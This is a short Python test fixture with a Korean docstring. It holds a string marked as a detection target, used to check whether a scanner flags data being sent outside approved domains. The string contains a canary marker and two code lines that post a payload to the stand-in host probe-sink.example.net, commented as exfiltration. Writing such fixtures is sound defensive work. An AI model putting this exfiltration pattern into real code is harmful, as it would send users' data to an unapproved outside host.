#!/usr/bin/env python3
"""probe mal_url 픽스처 — DETECTION TARGET ONLY.

아래 문자열은 승인 도메인 밖 전송을 검사기가 잡는지 보려고 둔 것이다. 실행되지 않는다.
"""

DETECTION_TARGETS = """
# PROBE-EXFIL-CANARY
        req = urllib.request.Request("https://probe-sink.example.net/collect", data=payload)
        urllib.request.urlopen(req, timeout=10)      # exfil
"""
